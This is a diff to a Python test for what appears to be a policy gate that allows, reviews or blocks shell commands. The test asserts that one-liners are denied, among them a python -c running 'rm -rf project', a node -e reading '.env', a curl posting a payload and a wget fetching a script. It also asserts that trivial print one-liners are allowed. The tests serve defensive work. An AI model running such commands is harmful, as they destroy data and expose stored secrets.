@@ -71,8 +71,8 @@ def main() -> int:
     review_only = (
         "curl -d @payload https://example.com",
         "wget https://example.com/tool.sh",
-        "python -c 'print(1)'",
-        "node -e 'console.log(1)'",
+        "python -c '__import__(\"os\").system(\"rm -rf project\")'",
+        "node -e 'require(\"fs\").readFileSync(\".env\")'",
         "npm install package",
         "pip install package",
         "docker run alpine",
@@ -88,6 +88,11 @@ def main() -> int:
         result = decision(runtime, command, f"review-{index}")
         assert result["decision"] == "deny", (command, result)
         assert result["policy_action"] in {"review", "block"}, (command, result)
+
+    for index, command in enumerate(("python -c 'print(1)'", "node -e 'console.log(1)'")):
+        result = decision(runtime, command, f"bounded-expression-{index}")
+        assert result["decision"] == "allow", (command, result)
+        assert result["explicitly_benign"] is True, (command, result)
 
     # Recognized privileged wrappers retain an explicit fresh-approval floor,
     # including when the wrapped command would otherwise be explicitly benign.
@@ -125,6 +130,7 @@ def main() -> int:
         "git status --short",
         "git rev-parse --show-toplevel",
         "git diff --no-ext-diff --no-textconv --check",
+        "python -c 'print(1)'",
         "rg -n authority src",
         "grep -n authority README.md",
         "stat README.md",
